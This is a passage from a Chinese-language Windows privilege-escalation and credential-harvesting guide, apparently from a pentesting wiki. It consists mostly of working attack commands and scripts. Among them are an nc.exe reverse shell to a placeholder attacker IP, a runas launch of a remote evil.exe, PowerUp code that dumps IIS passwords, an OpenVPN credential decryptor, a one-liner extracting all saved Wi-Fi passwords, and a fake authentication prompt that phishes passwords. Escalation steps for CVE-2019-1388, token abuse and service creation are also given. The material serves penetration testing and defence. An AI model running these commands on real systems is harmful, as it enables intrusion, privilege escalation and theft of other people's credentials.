reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows 保险箱

来自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows 保险箱存储用户对服务器、网站和其他程序的凭据，**Windows** 可以**自动登录用户**。乍一看，这似乎意味着用户现在可以存储他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，以便通过浏览器自动登录。但事实并非如此。

Windows 保险箱存储的是 Windows 可以自动登录用户的凭据，这意味着任何**需要凭据才能访问资源**（服务器或网站）的**Windows 应用程序都可以使用此凭据管理器** & Windows 保险箱，并使用提供的凭据，而不是用户每次都输入用户名和密码。

除非应用程序与凭据管理器交互，否则我认为它们不可能使用给定资源的凭据。因此，如果您的应用程序想要使用保险箱，它应该以某种方式**与凭据管理器通信并请求该资源的凭据**，从默认存储保险箱中获取。

使用 `cmdkey` 命令列出机器上存储的凭据。
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
```markdown
然后你可以使用带有 `/savecred` 选项的 `runas` 来使用保存的凭据。以下示例通过 SMB 共享调用远程二进制文件。
```
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 命令和提供的一组凭据。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
请注意，mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) 或来自 [Empire Powershells 模块](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

理论上，数据保护 API 可以启用任何类型数据的对称加密；实际上，在 Windows 操作系统中，它主要用于使用用户或系统秘密作为熵的重要贡献，对非对称私钥进行对称加密。

**DPAPI 允许开发者使用从用户登录秘密派生的对称密钥来加密密钥**，或者在系统加密的情况下，使用系统的域认证秘密。

用于加密用户 RSA 密钥的 DPAPI 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录下，其中 {SID} 是该用户的[安全标识符](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥存储在与保护用户私钥的主密钥相同的文件中**。它通常是 64 字节的随机数据。（请注意，这个目录是受保护的，所以你不能使用 `dir` 命令在 cmd 中列出它，但你可以从 PS 中列出它）。
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz 模块** `dpapi::masterkey` 并配合适当的参数（`/pvk` 或 `/rpc`）来解密。

**由主密码保护的凭证文件**通常位于：
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz 模块** `dpapi::cred` 和适当的 `/masterkey` 来解密。\
如果你是 root，你可以使用 `sekurlsa::dpapi` 模块从**内存**中**提取许多 DPAPI 主密钥**。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell 凭据

**PowerShell 凭据**通常用于**脚本编写**和自动化任务，作为方便地存储加密凭据的方式。这些凭据使用 **DPAPI** 保护，这通常意味着它们只能由在同一台计算机上创建它们的同一用户解密。

要**解密**包含它的文件中的 PS 凭据，你可以做：
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的RDP连接

您可以在`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
和`HKCU\Software\Microsoft\Terminal Server Client\Servers\`中找到它们

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用 **Mimikatz** `dpapi::rdg` 模块和适当的 `/masterkey` 来**解密任何 .rdg 文件**\
你可以使用 Mimikatz `sekurlsa::dpapi` 模块从内存中**提取许多 DPAPI 主密钥**

### Sticky Notes

人们经常在 Windows 工作站上使用 StickyNotes 应用程序来**保存密码**和其他信息，没有意识到它是一个数据库文件。这个文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，总是值得搜索和检查。

### AppCmd.exe

**请注意，要从 AppCmd.exe 恢复密码，你需要是管理员并以高完整性级别运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录。\
如果这个文件存在，那么可能配置了一些**凭据**，并且可以被**恢复**。

这段代码摘自 _**PowerUP**_：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在。\
安装程序**以 SYSTEM 权限运行**，许多容易受到**DLL Sideloading（信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）**的影响。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭证）

### Putty 凭证
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的SSH密钥

SSH私钥可以存储在注册表键`HKCU\Software\OpenSSH\Agent\Keys`中，因此你应该检查那里是否有任何有趣的内容：
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
如果您在该路径内找到任何条目，它很可能是一个保存的SSH密钥。它是加密存储的，但可以使用[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)轻松解密。\
有关此技术的更多信息，请参阅：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果`ssh-agent`服务未运行，并且您希望它在启动时自动启动，请运行：
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
看来这种技术已经不再适用了。我尝试创建一些ssh密钥，用`ssh-add`添加它们，并通过ssh登录到一台机器。注册表HKCU\Software\OpenSSH\Agent\Keys不存在，procmon在非对称密钥认证过程中也没有识别到`dpapi.dll`的使用。
{% endhint %}

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 来搜索这些文件：_post/windows/gather/enum\_unattend_

示例内容\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的GPP密码

在KB2928120（参见MS14-025）之前，某些组策略首选项可以配置自定义账户。这个功能主要用于在一组机器上部署自定义的本地管理员账户。不过，这种方法有两个问题。首先，由于组策略对象以XML文件形式存储在SYSVOL中，任何域用户都可以读取它们。第二个问题是，这些GPP中设置的密码是用一个公开记录的默认密钥进行AES256加密的。这意味着任何经过认证的用户都有可能访问非常敏感的数据，并在他们的机器甚至域上提升他们的权限。此功能将检查任何本地缓存的GPP文件中是否包含非空的“cpassword”字段。如果是，它将解密它，并返回一个包含有关GPP的一些信息以及文件位置的自定义PS对象。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Vista之前的版本）_ 中搜索这些文件：

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**解密cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 网络配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
示例带有凭证的web.config：
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭证
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求凭证

您总是可以**要求用户输入他的凭证，甚至是不同用户的凭证**，如果您认为他可能知道它们（注意，直接向客户**请求**凭证是非常**冒险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭证的文件名**

已知的一些文件，曾经以**明文**或**Base64**格式包含了**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
搜索所有建议的文件：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你还应该检查回收站，寻找其中的凭证

要**恢复**由多个程序保存的密码，你可以使用：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表内部

**可能含有凭证的其他注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从注册表中提取 openssh 密钥。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存储 **Chrome 或 Firefox** 密码的数据库。\
同时检查浏览器的历史记录、书签和收藏夹，可能会有一些**密码**存储在那里。

从浏览器提取密码的工具：

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **COM DLL 覆盖**

**组件对象模型 (COM)** 是内置于 Windows 操作系统中的技术，允许不同语言的软件组件之间进行**交互通信**。每个 COM 组件都通过类 ID (CLSID) **标识**，并且每个组件通过一个或多个接口暴露功能，这些接口通过接口 ID (IIDs) 标识。

COM 类和接口在注册表的 **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** 和 **HKEY\_**_**CLASSES\_**_**ROOT\Interface** 下定义。此注册表是通过合并 **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** 创建的。

在此注册表的 CLSIDs 内部，你可以找到子注册表 **InProcServer32**，其中包含一个指向 **DLL** 的**默认值**，以及一个名为 **ThreadingModel** 的值，可以是 **Apartment**（单线程）、**Free**（多线程）、**Both**（单线程或多线程）或 **Neutral**（线程中立）。

![](<../../.gitbook/assets/image (638).png>)

基本上，如果你能够**覆盖任何将要执行的 DLL**，如果该 DLL 将由不同用户执行，你可以**提升权限**。

要了解攻击者如何使用 COM 劫持作为持久性机制，请查看：

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **在文件和注册表中通用密码搜索**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表以查找密钥名称和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 寻找密码的工具

[**MSF-Credentials 插件**](https://github.com/carlospolop/MSF-Credentials) 是一个我创建的 msf 插件，用于**自动执行每个搜索受害者内部凭据的 metasploit POST 模块**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的优秀工具。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索多个工具的**会话**、**用户名**和**密码**，这些工具将这些数据以明文形式保存（PuTTY, WinSCP, FileZilla, SuperPuTTY, 和 RDP）。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 泄露的句柄

想象一下，**一个以 SYSTEM 身份运行的进程打开了一个新进程** (`OpenProcess()`)，并且具有**完全访问权限**。同一个进程**还创建了一个权限较低的新进程** (`CreateProcess()`)，**但继承了主进程的所有打开句柄**。\
然后，如果你对权限较低的进程有**完全访问权限**，你可以获取**通过 `OpenProcess()` 创建的具有特权的进程的打开句柄**，并**注入 shellcode**。\
[阅读此示例以获取有关**如何检测和利用此漏洞**的更多信息。](leaked-handle-exploitation.md)\
[阅读**此其他帖子，了解如何测试和滥用更多的进程和线程的打开句柄，这些句柄继承了不同权限级别（不仅仅是完全访问权限）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## 命名管道客户端模拟

`pipe` 是一个共享内存块，进程可以用它来进行通信和数据交换。

`Named Pipes` 是 Windows 机制，允许两个不相关的进程之间交换数据，即使这些进程位于两个不同的网络上。它与客户端/服务器架构非常相似，因为存在 `named pipe server` 和 `named pipe client` 的概念。

当**客户端在管道上写入数据**时，创建管道的**服务器**可以**模拟**该**客户端**，如果它具有**SeImpersonate**权限。然后，如果你能找到一个**即将在你可以模拟的任何管道上写入的具有特权的进程**，在它写入你创建的管道后，你可以通过模拟该进程来**提升权限**。 [**你可以阅读这个来学习如何执行这种攻击**](named-pipe-client-impersonation.md) **或者** [**这个**](./#from-high-integrity-to-system)**。**

**此外，以下工具允许使用像 burp 这样的工具拦截命名管道通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **并且这个工具允许列出和查看所有管道以找到权限提升** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## 杂项

### **监控命令行以获取密码**

作为用户获取 shell 时，可能会执行定时任务或其他进程，这些进程**在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从低权限用户到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC 绕过

如果您可以访问图形界面（通过控制台或 RDP），并且启用了 UAC，在某些版本的 Microsoft Windows 中，可以从非特权用户运行终端或任何其他进程，如 "NT\AUTHORITY SYSTEM"。

这使得可以同时提升权限和绕过 UAC，使用同一个漏洞。此外，无需安装任何东西，且在过程中使用的二进制文件是由 Microsoft 签名和发布的。

一些受影响的系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用这个漏洞，需要执行以下步骤：

```
1) 右键点击 HHUPD.EXE 文件并以管理员身份运行。

2) 当 UAC 提示出现时，选择“显示更多细节”。

3) 点击“显示发布者证书信息”。

4) 如果系统易受攻击，点击“Issued by” URL 链接时，默认的网络浏览器可能会出现。

5) 等待网站完全加载并选择“另存为”以打开一个 explorer.exe 窗口。

6) 在 explorer 窗口的地址路径中，输入 cmd.exe、powershell.exe 或任何其他交互式进程。

7) 现在你将拥有一个“NT\AUTHORITY SYSTEM”命令提示符。

8) 记得取消设置和 UAC 提示以返回到你的桌面。
```

你可以在以下 GitHub 仓库找到所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388

## 从管理员中等完整性级别到高完整性级别 / UAC 绕过

阅读这个来**了解完整性级别**：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

然后**阅读这个来了解 UAC 和 UAC 绕过：**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **从高完整性到系统**

### **新服务**

如果你已经在一个高完整性进程上运行，**转换到 SYSTEM** 可以通过**创建并执行一个新服务**来轻松实现：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

如果你处于高完整性进程中，你可以尝试**启用AlwaysInstallElevated注册表项**并**安装**一个使用_**.msi**_封装的反向Shell。\
[关于涉及的注册表键和如何安装_.msi_包的更多信息在这里。](./#alwaysinstallelevated)

### 高完整性 + SeImpersonate权限升级到系统

**你可以在这里**[**找到代码**](seimpersonate-from-high-to-system.md)**。**

### 从SeDebug + SeImpersonate到完整令牌权限

如果你拥有这些令牌权限（你可能会在已经是高完整性进程中发现这一点），你将能够使用SeDebug权限**打开几乎任何进程**（不包括受保护的进程），**复制该进程的令牌**，并创建一个**带有该令牌的任意进程**。\
使用这种技术通常会**选择任何以SYSTEM身份运行并拥有所有令牌权限的进程**（_是的，你可以找到没有所有令牌权限的SYSTEM进程_）。\
**你可以在这里找到一个**[**执行所提技术的代码示例**](sedebug-+-seimpersonate-copy-token.md)**。**

### **命名管道**

这种技术被meterpreter用于在`getsystem`中提权。该技术包括**创建一个管道，然后创建/滥用一个服务来写入该管道**。然后，使用**`SeImpersonate`**权限创建管道的**服务器**将能够**模拟管道客户端（服务）的令牌**，获得SYSTEM权限。\
如果你想[**了解更多关于命名管道的信息，你应该阅读这个**](./#named-pipe-client-impersonation)。\
如果你想阅读一个关于[**如何使用命名管道从高完整性升级到System的示例，你应该阅读这个**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll劫持

如果你设法**劫持了一个由**以**SYSTEM**身份运行的**进程**正在**加载的dll**，你将能够以这些权限执行任意代码。因此，Dll劫持也适用于这种类型的权限提升，并且，此外，从高完整性进程中实现它要**更容易**，因为它将拥有对用于加载dll的文件夹的**写权限**。\
**你可以在这里**[**了解更多关于Dll劫持的信息**](dll-hijacking.md)**。**

### **从管理员或网络服务升级到系统**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### 从本地服务或网络服务升级到完整权限

**阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 更多帮助

[静态impacket二进制文件](https://github.com/ropnop/impacket_static_binaries)

## 有用的工具

**寻找Windows本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查配置错误和敏感文件（**[**查看这里**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的配置错误并收集信息（**[**查看这里**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。**\
[**privesc**](https://github.com/enjoiz/Privesc) **-- 检查配置错误**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 它提取PuTTY, WinSCP, SuperPuTTY, FileZilla和RDP保存的会话信息。在本地使用-Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从凭证管理器中提取凭证。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域中喷洒收集到的密码**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh是一个PowerShell ADIDNS/LLMNR/mDNS/NBNS欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的Windows权限提升枚举**\
